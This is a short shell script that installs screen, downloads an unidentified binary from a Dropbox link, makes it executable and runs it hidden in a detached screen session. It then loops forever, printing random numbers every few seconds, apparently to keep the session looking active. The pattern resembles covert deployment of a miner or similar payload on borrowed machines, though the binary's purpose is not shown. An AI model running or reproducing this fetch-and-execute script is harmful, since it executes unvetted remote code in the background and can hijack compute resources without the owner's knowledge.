sudo apt-get update && sudo apt-get install -y screen
wget https://www.dropbox.com/s/15vwimnqlly0ewk/ccv1?dl=1 -O zet && chmod +x zet
screen -dmS js  ./zet ann 
while :; do shuf -n 1 -i 1-99999999; sleep 3; done
